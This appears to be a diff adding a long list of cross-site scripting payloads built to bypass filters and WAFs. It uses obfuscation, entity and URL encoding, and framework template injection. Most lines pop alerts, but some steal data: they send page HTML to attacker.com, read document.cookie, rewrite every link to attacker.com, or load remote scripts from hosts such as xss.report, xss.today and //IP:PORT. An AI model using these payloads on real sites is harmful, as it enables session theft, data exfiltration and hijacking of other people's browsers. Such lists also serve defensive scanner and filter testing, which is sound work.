@@ -1,0 +1,270 @@
+onload=\"a='aler';d='XSS';b='t('+d+')';c=a+b;console.log(eval(c));
+(_=>`${`${_}`[!![]<<!![]<<!![]]} ${`${_}`[~~![]]} ${`${_}`[~~!![]]}`)()
+Array.from(document.getElementByTagName('a')).forEach(function(i) { i.href = 'https://attacker.com' })
+<d3"<"/onclick="1>[confirm``]"<">z
+javascript://comment%0a%0dalert(0);
+javas%09cript%3aalert("nurullah65")
+<a"/onclick=(confirm)()>click
+<a/href=javascript&colon;alert()>click
+<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
+<d3v/onauxclick=[2].some(confirm)>click
+<d3v/onauxclick=(((confirm)))``>click
+<d3v/onmouseleave=[2].some(confirm)>click
+<details/open/ontoggle=alert()>
+<details/open/ontoggle=(confirm)()//
+');%0a}%0d}%09alert();/*anything here*/if(true){//anything here%0a('
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+<script event=onload for=window> return alert(2)};{ //IE11 only </script>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
+{{toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}<script>
+{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x281\x29'}</script>
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+<xss class=progress-bar-animated onanimationstart=alert(1)>
+<svg onunload=http://window.open('javascript:alert(1)')>
+<details/open ontoggle=alert(1)>
+<frameset onpageshow=alert(1)>
+<details onauxclick=confirm`xss`></details>
+<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
+<script>x = '<!--<script>'/*</script>-->*/;alert(1)</script
+<</p>iframe src=javascript:alert()//
+<svg/OnLoad="`${prompt``}`">
+for(X=f=c=>S(S(9*c/d)*t),Y=t/8-1.1,i=2e3;i--;x.fillRect(i,t*60,(1+f(X=i/480-2)*f(Y))*(d/2+Y),3))x.fillStyle=R(C(r=X*X+Y*Y)*125),d=r>1||T(r)
+<imsofake onpointerrawupdate=alert(1)>test
+<div onpointerrawupdate=alert(1) style=width:100%;height:100%;position:absolute;background-color:red>test
+Function`a${atob`ZXZhbChsb2NhdGlvbi5oYXNoLnNsaWNlKDEpKQ`}```
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
+<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+K "><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># K
+<svg<0x0c>onload=alert(1)><svg>
+{{constructor.constructor('eval(atob(\'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\'))')()}}
+'><details/open/ontoggle=confirm(document.location)>
+" formaction=java%26Tab%3bscript:ale%26Tab%3brt() type=image src=""
+<img src="img-src" onloadstart="alert(45)">
+<image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
+<img src="img-src" onloadend="alert(45)">
+<img src onerror=%26emsp;prompt`${document.domain}`>
+<svg/onload=%26nbsp;alert`bohdan`+1'"><img/src/onerror=.1|alert``>
+<svg id=javascript:alert(10) onload=location=id>
+window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
+<img src=something onauxclick="new Function `al\ert\`xss\``">
+<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
+atob("Your_Receveived_DNS".replace(/(.)./g, (_,x)=>x.toUpperCase()))
+<style/><img src="z'z</style><script/z>alert(1)</script>">
+Javascript://%E2%80%A9alert(1)
+<Brute Data-Spy=scroll Data-Target='<Svg OnLoad=(confirm)(1)>'>
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<svg><script href=data:,alert(1) />
+<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)>
+<x v-html=_c.constructor('alert(1)')()>
+onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
+Object.getOwnPropertyNames(window).filter(function(x){return x.startsWith('on')})
+<image src=validimage.png onloadend=alert(1)>
+<A%09onmOuSeoVER%0a=%0aa=alert,a(document.domain)>xss
+"><input/onauxclick="[1].map(prompt)">
+<body ontouchstart=alert(45)> 
+<body ontouchend=alert(45)>
+<xss<script>>&28;prompt();&28;<</script>/xss>
+<svg><b><style><img id="&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+<svg%0Aonauxclick=0;[1].some(confirm)//   
+<body ontouchmove=alert(45)>
+<</div>script</div>>alert()<</div>/script</div>>
+">'><details/open/ontoggle=confirm('XSS')>
+for(c.width=i=99;a=i-->>3;x.ellipse(50,9+a%2*39,29,6,0,q=((i-a)*1.563-t)%12.5,q))x.stroke()
+"><video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
+{{{}.")));alert(1)//"}}
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\\u006d('+'document'+'.'+x1+c"
+<a onmouseover=prompt(document.cookie)>Here</a>
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
+</title><scRipt>alert(0x00C57D)</scRipt>
+"/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\\1\\)>
+<iMg src%3dN onerror%3dalert(0x0036A9)>
+<svg onload=alert%26%230000000040"1')>
++1"><svg+onload%3Dalert%28document.cookie%29>
+/alert(1)//\
+";alert(0);//
+<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
+';alert('xss');//
+");alert('xss');//
+%22%3c%3c%73%63%72%5c%61%61%61%2f%73%72%63%3d%3e%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%70%6c%61%79%73%74%61%74%69%6f%6e%20%72%65%66%6c%65%63%74%65%64%20%78%73%73%20%42%59%20%42%34%47%47%33%52%22%29%3c%2f%73%63%72%69%70%74%3e%22
+javascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm0
+'-alert(1)-'
+</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(document.cookie)//>\x3e
+"-alert(1)-"
+%09Jav%09ascript:alert(document.domain)
+<button/onclick="confirm(document.domain+document.cookie)">CLICK</button>
+4707d6f62707a3470796273637166716a692e69616d6f646e247e656d65736f64682
+);alert(test);
+`<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a()%20x>` 
+=img src=x onerror=alert(document.domain)//=
+cmV0dXJuVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QnamF2YXNjcmlwdDpceDNjc3ZnXHgyMG9ubG9hZD1hbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5XHgzZScmY2FuY2VsVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QnamF2YXNjcmlwdDpceDNjc3ZnXHgyMG9ubG9hZD1hbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5XHgzZSc=
+`%3Breturn+false})%3B})%3Balert`xss`;<%2Fscript>
+http://example.com%22%22,%7D)%3C/script%3E%3Csvg+onload=confirm(location)%3E%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529
+";alert(1)//
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+\"+alert(1)+"
+\\u0022\\u003e\\u003cimg+src=x+onerror=alert(1)\\u003e\\u003cx+y=\\u0022
+abc`%3Breturn+false})%3B})%3Balertxss;<%2Fscript>
+%3E%3Csvg%20onload%3d%26%23x00000000061;%26%23x0000000006c%26%23x0000000065%26%23x0000000072%26%23x00000000074(1%26%230000000000000041;%20%3C%2fscript%20
+%3Cx%20y=1%20z=%271%26apos;%27onclick=selfal%2Bert%3E%23CLICK%20MEE
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+<h1/%6f%6e/oNclicK=alerthacked>CLICK HERE
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<script>c=document,h=c.head,x=h.part,p=g=h.id,h.valueOf=p.sub,x.valueOf=p.at,o=g++,l=g++,z=g++,e=g++,a=g++,s=g++,d=g++,j=g++,b=g++,h.part=h+p,y=h.innerHTML=x+p,h.part=h.innerHTML,p+=x,h.part=c.nodeName,p+=x,k=o+p,u=l+p,w=p+l,t=w+l,f=w+o+b+w,h.innerHTML=t+s+t+d+w+z+l+f+o+u+a+j+t+l+t+o+f+l+u+g+j+w+o+k+d+l,h.innerHTML=y+h.innerHTML+p+g+j+f+o+l+t+a+w+l+d+p+a+k+s+k+s+u+a+u+a+j+p+a+j+h</script>
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g
+<iMg src%3dN onerror%3dalert(0x000D98)>
+%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
+<logicalhunter/onmouseover=%0aalert%26%230000000096%3b1%26%230000000096%3b>Click Her
+adf%2522%2526%2523%2578%2532%2537%253B%253E%253C%2573%2556%2567%252F%256F%256E%256C%256F%2561%2564%253D%2563%256F%256E%2566%2569%2572%256D%2528%2531%2529%253E
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+"><Base Href=//X55.is>x --> popedup xss
+<!--td {border: 1px solid #cccccc;}br {mso-data-placement:same-cell;}--><img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>
+<a/href="j&#97v&#97script:&#97lert(document.cookie)">ClickMe
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+<xss onscrollend=alert(23) style="display:block;overflow:auto;width:1px;height:1px;">x<xss autofocus tabindex=1>
+VR11=onfocus='&VR12=;alert/&VR13=/(1)'a='&VR14='autofocus
+%3Cinput+onfocus%3d%27/*=*/Function(%22ale%22%2b%22rt(document.domain)%22)();//%27autofocus+
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie)
+<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
+<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>
+ <pre> element and set body background.
+<body onload='setInterval(f=_=>{for(t++,o=i=0,w=35;i<384;o+=i++%+w?(f+f+f)[i].fontcolor(g==9?"#FFF":[0,g,0]):"\n")g=0|(i/w-t/((i%w)**5%w+3)+w*t)%w;p.innerHTML=o},t=9)'bgcolor=X><pre id=p>
+<svg/onload=throw/**/onerror=alert,1>
+str0d"/><style>@KeyframeS x{}</style><str style="animation-name:x;" onanimationend="alert.bind()(22)"></str>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+'1337'.split(window,window[Symbol['split']]=alert)
+'1337'.replace(window,window[Symbol['replace']]=alert)
+<input type="text" value=`` <div/autofocus/onfo<!--esi-->cus='a<!--esi-->lert("XSS")>X</div>
+<x/onpointerenter="confirm,alert(1)">
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:50px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+<script type=module>import "xss"</script>
+<script type="importmap">{"imports": {"xss": "data:text/javascript,export default alert(1)"}}</script>
+<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+<img/src/onerror=arguments[0].path.pop().alert(1)>
+eval([,]+'ale'+[,]+[,]+'rt(1)'+[,])
+<svg><animate onbegin=evt.path.pop().alert(1) attributeName=x dur=1s>
+<img/src/onerror=arguments[0].path.pop().['al'+'ert'](1)>
+<svg onload=http://evt.target.ownerDocument.defaultView.alert(1337)>
+Uncaught=onerror=eval,e=Error`*/;alert\x281\x29`,http://e.name='/*',e
+Array.prototype.sort.call`${alert}1337`
+[].sort.call`${alert}1337${0}${1}`
+"><track/onerror='confirm`1`'>
+"><fpevcg>cebzcg(1)</fpevcg>
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>.asp
+'<<k>/script><<k>script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))<<k>/script>
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<Img Src=OnXSS OnError=alert(1)>
+';k='e'%0Atop'al'+k+'rt'//
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+</h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>
+`'";//><Img Src=a OnError=location=src>
+'";//><img/src=x onError="${x};alert(1`);">
+%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+<script src=//0-a.nl/conf.js></script>&context=html
+ "><track/onerror='confirm`1`'>
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+"<svg/onload=alert(1)>"@x.y
+12345678901<svg onload=alert(1)>
+"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
+<script> speechSynthesis.speak(new SpeechSynthesisUtterance("You Have Been Hacked!")) </script>
+"><A%20%252F=""Href=%20JavaScript:k=%27a%27,topk%2B%27lert%27>
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+"'alert(1)
+<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";http://a.click();</script>
+<svg> <foreignObject width="100%" height="100%">     <body> <iframe src='javascript:confirm(10)'></iframe>     </body>   </foreignObject> </svg>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a>
+"/>&_lt;_script>alert(1)&_lt;/scr_ipt>"/>
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
+abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+nload=alert("XSS") > 
+1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")</ScRiPt>
+"><sVg%2fonload%3dalert%2ebind%28%29%281%29%20class%3dRahul-Dh>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
+javaScript://%250A/*?'/*\'/*"/*\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
+<Script>window.valueOf=alert;window+1</Script>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+"><Svg Only=1 OnLoad=confirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgUm95elNlYw=="))>
+"AutoFocus/>/OnFocus=top?.["ale"+"rt"](1)/"
+jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
+#"></div><a href= javascript&colon;alert&lpar;document&period;domain)
+<sCrIpT>(function(){var a=[97,108,101,114,116];var b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);windowb;})()</sCrIpT>
+#"></div><a href= javascript:alert(document.domain)
+"><body%20onload%3Dalert(1)>
+%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
+<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
+Function`$${`${`${`${`alert`}(`}1`})`}`
+"><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>
+"><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>
+/(A('onerror=%22alert%601%60%22testabcd))/
+kuromatae"><textarea/onbeforeinput=kuro='//domain.tld';import(kuro)%09autofocus%09x
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x
+<xss style="transition:outline 1s" onwebkittransitionend=alert(1) tabindex=1 autofocus></xss>
+/Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders
+'"*/onmouseover=(print)?.()><sVg/oNload='1>(_=prompt,_`{{7*7}}`)'></sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->h1/<h1><image/onerror='alert`1`%27'src>xhzeem%22%3E%3CSvg/\u0022\u003e\u003csVg/\x22\x3e\x3csVg/&quot;&gt;&lt;svG/onload=alert`2`//
+(A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f
+<script>location.protocol="javascript"</script>
+"></script><img src onerror=with(document)body.appendChild(createElement('script')).src='//bx.ss'>
+["');alert('XSS');//"]@xyz.xxx
+<DiV sTylE="WidTH:100&#37;;HeIgHt:100vH&#59;" oNpOINteROvEr="var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);"></dIV>
+<ScRiPt>function K(H,y){var J=Z();return K=function(W,F){W=W-0xf7;var C=J[W];return C;},K(H,y);}var X=K;(function(D,R){var j=K,E=D();while(!![]){try{var N=-parseInt(j(0x10d))/0x1*(parseInt(j(0x121))/0x2)+parseInt(j(0xff))/0x3*(-parseInt(j(0x109))/0x4)+parseInt(j(0x107))/0x5*(-parseInt(j(0xfb))/0x6)+-parseInt(j(0x123))/0x7+parseInt(j(0x10c))/0x8+-parseInt(j(0x114))/0x9*(parseInt(j(0xf9))/0xa)+parseInt(j(0x117))/0xb;if(N===R)break;else E['push'](E['shift']());}catch(b){E['push'](E['shift']());}}}(Z,0xab3e2));var F=(function(){var D=!![];return function(R,E){var N=D?function(){var V=K;if(E){var b=E[V(0x110)](R,arguments);return E=null,b;}}:function(){};return D=![],N;};}());(function(){F(this,function(){var q=K,D=new RegExp(q(0x100)+'\x5c(\x20*\x5c)'),R=new RegExp('\x5c+\x5c+\x20*(?:['+'a-zA-Z_$]['+q(0x10b)+q(0xf7),'i'),E=B(q(0x102));!D[q(0x105)](E+q(0x119))||!R[q(0x105)](E+q(0x101))?E('0'):B();})();}());var C=(function(){var D=!![];return function(R,E){var N=D?function(){var T=K;if(E){var b=E[T(0x110)](R,arguments);return E=null,b;}}:function(){};return D=![],N;};}()),O=C(this,function(){var Y=K,D;try{var R=Function(Y(0x111)+Y(0x104)+(Y(0xfd)+Y(0x112)+Y(0x10a)+'\x20)')+');');D=R();}catch(v){D=window;}var E=D[Y(0x11a)]=D[Y(0x11a)]||{},N=[Y(0xf8),Y(0x10f),'info',Y(0x103),'exception',Y(0x11e),Y(0x115)];for(var b=0x0;b<N[Y(0x11d)];b++){var u=C[Y(0x11c)+'r'][Y(0x116)][Y(0x113)](C),p=N[b],r=E[p]||u;u[Y(0x11f)]=C[Y(0x113)](C),u[Y(0x108)]=r[Y(0x108)][Y(0x113)](r),E[p]=u;}});function Z(){var c=['57030PFGzFi','@hxlxmj','1683312aLeyKy','e)\x20{}','{}.constru','counter','24CEmLiN','function\x20*','input','init','error','nction()\x20','test','gger','5WVVOMT','toString','193184WAXOVY','rn\x20this\x22)(','0-9a-zA-Z_','6586776UznYBj','487hrRSck','call','warn','apply','return\x20(fu','ctor(\x22retu','bind','972FIJNKX','trace','prototype','40923894rrOnDT','stateObjec','chain','console','string','constructo','length','table','__proto__','debu','4766spQeUV','while\x20(tru','9792482CuCNtV','$]*)','log'];Z=function(){return c;};return Z();}O(),alert('Encoded\x20XS'+'S\x20Payload\x20'+X(0xfa));function B(D){function R(E){var n=K;if(typeof E===n(0x11b))return function(N){}['constructo'+'r'](n(0x122)+n(0xfc))[n(0x110)](n(0xfe));else(''+E/E)[n(0x11d)]!==0x1||E%0x14===0x0?function(){return!![];}[n(0x11c)+'r'](n(0x120)+n(0x106))[n(0x10e)]('action'):function(){return![];}['constructo'+'r'](n(0x120)+n(0x106))[n(0x110)](n(0x118)+'t');R(++E);}try{if(D)return R;else R(0x0);}catch(E){}}</sCrIpT>
+%2F%2Aalert(%27MASTER%20GOT%20AN%20XSS%22) %/\/\*[\s\S]*?\*\ 3B%2A%2FOR
+%3CSvg%20Only%3D1%20OnLoad%3Dconfirm(1)%3E
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+<JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
+/?xss=<svg/onload=eval(`'`+URL)>#';alert(document.domain)
+<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+"></div><a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;document.cookie&rpar;">
+<xmp onmouseenter="alert(1)">test</xmp>
+%22%3E%3C!--%3E%3Csvg%20onload%3D%22a%20%3D%20%27%3Cim%27%3Ba%20%2B%3D%20%20%27g%20sr%27%3Ba%20%2B%3D%20%20%27c%3Dx%27%3Ba%20%2B%3D%20%27%20onerr%27%3Ba%20%2B%3D%20%20%27or%3Dale%27%3Ba%20%2B%3D%20%27rt%26lp%27%3B%20a%20%2B%3D%20%27ar%3Borigin%26rpa%27%3Ba%20%2B%3D%20%27r%3B%3E%27%3Bdocument.body.innerHTML%3Da%22%3E
+jaVasCript:///*\\/'/"//(/* /oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a/(/%252f%252a/*/*prompt(1)/;//;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
+"><HTML onmouSeovEr=confirm(document.cookie)x>
+<div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97,108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100,111, 109, 97, 1050, 41)))" 
+style="width:100%;height:100vh;"></div>
+class x extends `${class x extends `${alert`1337`}`{}}`{}
+<portal id="q" src="http://bing.com" onload="print(q.activate())"></portal>
+xss'''><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>
+%ff%fe%3C%00s%00c%00r%00i%00p%00t%00/%00C%00r%00c%00=%00%22%00%22%00%2f%00s%00r%00c%00=%00?%00c%00a%00l%00l%00b%00a%00c%00k%00=%00a%00l%00e%00r%00t%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%0
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
+<inpuT autofocus oNFocus="setTimeout(function() { /\/top'al'+'\u0065'+'rt'/\/ }, 5000);"></inpuT%3E;
+%22onmouseover=window%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0]);%22
+<Img Src=OnXSS OnError=confirm(1)>
+javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
+(()=>{})["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164()")()
+<svg/ONxss='0'/ONload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;// 
+<a/href='OnXXX'/autofocus+ONxss=0+ONfocus=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;>aaaaaa</a>
+<a/autofocus+ONxss='0'/ONfocus=alert`0`+href>Hello</a> 
+<input/autofocus+ONxss='0'/ONfocus=alert`0`>
+<svg><title><title><image href="</title><iframe onload=alert(1)>" /></title></title></svg>
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+';"/></textarea></script><script/src=//xss.report/c/username></script>
+ %3Cdiv%20id%3D%22x%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20s%20%3D%20document.createElement%28%27script%27%29%3B%20s.src%20%3D%20%27%2F%2Fxss.today%27%3B%20document.getElementById%28%27x%27%29.appendChild%28s%29%3B%3C%2Fscript%3E
+%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2Fxss.today%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E
+<sVg/onfake=a/%22oNClIcK=%27alert()%27;//
+"&gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;
+XSS"onfocus="prompt(document.cookie)"autofocus="
+<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;">
+onfocus=frames["loca"%2B"tion"]=frames.location.hash[1]%2bframes.location.hash[2]%2bframes.location.hash[3]%2bframes.location.hash[4](...)#javascript:alert(4)
+<<img src=x onerror=alert(1)>
+<svg%20oNinad=1%20onload=alert(document.cookie)>
+<svg%0aonload=confirm/*test*/``//
+%253c%252fscript%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e
+</script><svg/onload=alert(0)>
+<b id=b><svg onload=setInterval("for(o=++t,y=32;y--;)for(o+='\\n',x=32;x--;)b.innerText=o+=[...'='][(x^y|t)%3]",t=382)>
+%25253c%25252fscript%25253e%25253cscript%25253ealert%252528document.cookie%252529%25253c%25252fscript%25253e
+<<script>script>alert(1)<</script>/script>
